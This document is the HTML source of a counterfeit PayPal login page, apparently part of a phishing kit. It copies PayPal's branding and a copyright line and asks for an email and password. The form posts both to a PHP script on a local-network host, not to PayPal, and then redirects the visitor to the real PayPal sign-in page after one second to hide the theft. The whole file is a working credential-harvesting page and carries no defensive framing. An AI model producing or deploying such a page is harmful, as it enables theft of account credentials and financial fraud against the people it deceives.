<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>PayPal Login</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        background-color: #f7f7f7;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
      }
      .login-container {
        background-color: #ffffff;
        padding: 20px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        border-radius: 8px;
        max-width: 400px;
        width: 100%;
        text-align: center;
      }
      .login-container h2 {
        color: #0070ba;
        margin-bottom: 20px;
      }
      .form-group {
        margin-bottom: 15px;
        text-align: left;
      }
      .form-group label {
        display: block;
        margin-bottom: 5px;
      }
      .form-group input {
        width: 100%;
        padding: 10px;
        border: 1px solid #ccc;
        border-radius: 4px;
      }
      .login-btn {
        background-color: #0070ba;
        color: #ffffff;
        padding: 10px;
        border: none;
        border-radius: 4px;
        cursor: pointer;
        width: 100%;
        font-size: 16px;
      }
      .login-btn:hover {
        background-color: #005a99;
      }
      .footer {
        margin-top: 20px;
        font-size: 12px;
        color: #555;
      }
    </style>
  </head>
  <body>
    <div class="login-container">
      <h2>PayPal Login</h2>
      <form
        action="http://192.168.0.105/process_login.php"
        method="POST"
        onsubmit="redirectToPayPal()"
      >
        <div class="form-group">
          <label for="email">Email</label>
          <input type="email" id="email" name="email" required />
        </div>
        <div class="form-group">
          <label for="password">Password</label>
          <input type="password" id="password" name="password" required />
        </div>
        <button type="submit" class="login-btn">Log In</button>
      </form>
      <div class="footer">Â© 2025 PayPal. All rights reserved.</div>
    </div>
    <script>
      function redirectToPayPal() {
        setTimeout(function () {
          window.location.href = "https://www.paypal.com/signin";
        }, 1000); // Redirect after 1 second
      }
    </script>
  </body>
</html>
